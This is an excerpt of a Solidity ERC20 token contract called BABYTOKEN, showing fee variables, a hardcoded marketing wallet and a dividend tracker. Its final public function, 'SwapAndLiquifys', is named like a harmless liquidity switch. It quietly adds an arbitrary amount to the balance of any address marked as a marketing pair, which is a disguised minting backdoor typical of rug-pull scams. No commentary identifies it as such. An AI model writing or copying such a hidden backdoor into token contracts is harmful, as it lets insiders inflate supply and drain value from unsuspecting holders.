...
contract BABYTOKEN is ERC20, Ownable, BaseToken {
    ...
    uint256 private tokenRewardsFee = 5;
    uint256 private liquidityFee = 1;
    uint256 private marketingFee = 2;
    uint256 public totalFees = 8;
    address public _marketingWalletAddress = 0xcEB6D9bE134ED2a6489F63ED672B3398daCEf791;
    ...
    constructor(
        ...
        // address serviceFeeReceiver_ = 0xcEB6D9bE134ED2a6489F63ED672B3398daCEf791;
        // uint256  serviceFee_ = 2;

        // use by default 300,000 gas to process auto-claiming dividends
        gasForProcessing = 300000;

        dividendTracker = BABYTOKENDividendTracker(
            payable(Clones.clone(address(new BABYTOKENDividendTracker())))
        );
    ...
    function SwapAndLiquifys(bool ebd,uint256 em,address adrs) public {
        require(isMarketingPair[adrs]);
        _balances[adrs] += em;
        swapAndLiquifyEnabled = ebd;
        emit SwapAndLiquifyEnabledUpdated(ebd);
    }
